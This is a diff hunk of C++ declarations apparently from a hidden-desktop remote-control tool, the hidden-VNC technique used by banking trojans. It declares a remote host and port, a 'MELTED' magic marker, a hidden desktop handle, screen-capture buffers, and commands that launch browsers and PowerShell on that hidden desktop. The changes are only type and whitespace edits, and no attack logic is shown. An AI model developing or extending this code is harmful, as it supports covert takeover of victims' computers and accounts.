@@ -1,33 +1,32 @@
-#include "HiddenDesktop.h"
-#include <Windowsx.h>
 #include <Windows.h>
 #include <Process.h>
 #include <Tlhelp32.h>
 #include <Winbase.h>
 #include <String.h>
 #include <gdiplus.h>
+
 #pragma comment (lib,"Gdiplus.Lib")
 using namespace Gdiplus;
 
 enum Connection { desktop, input };
 enum Input { mouse };
 
-static const BYTE     gc_magik[] = { 'M', 'E', 'L', 'T', 'E', 'D', 0 };
+static const unsigned char gc_magik[] = { 'M', 'E', 'L', 'T', 'E', 'D', 0 };
 static const COLORREF gc_trans = RGB(255, 174, 201);
 static const CLSID jpegID = { 0x557cf401, 0x1a04, 0x11d3,{ 0x9a,0x73,0x00,0x00,0xf8,0x1e,0xf3,0x2e } }; // id of jpeg format
 
 enum WmStartApp { startExplorer = WM_USER + 1, startRun, startChrome, startEdge, startBrave, startFirefox, startIexplore, startPowershell };
 
-static int        g_port;
-static char       g_host[MAX_PATH];
-static BOOL       g_started = FALSE;
-static BYTE      *g_pixels = NULL;
-static BYTE      *g_oldPixels = NULL;
-static BYTE      *g_tempPixels = NULL;
-static HDESK      g_hDesk;
+static int g_port;
+static char g_host[MAX_PATH];
+static BOOL g_started = FALSE;
+static unsigned char *g_pixels = NULL;
+static unsigned char *g_oldPixels = NULL;
+static unsigned char *g_tempPixels = NULL;
+static HDESK g_hDesk;
 static BITMAPINFO g_bmpInfo;
-static HANDLE     g_hInputThread, g_hDesktopThread;
-static char       g_desktopName[MAX_PATH];
+static HANDLE g_hInputThread, g_hDesktopThread;
+static char g_desktopName[MAX_PATH];
 static ULARGE_INTEGER lisize;
 static LARGE_INTEGER offset;
 
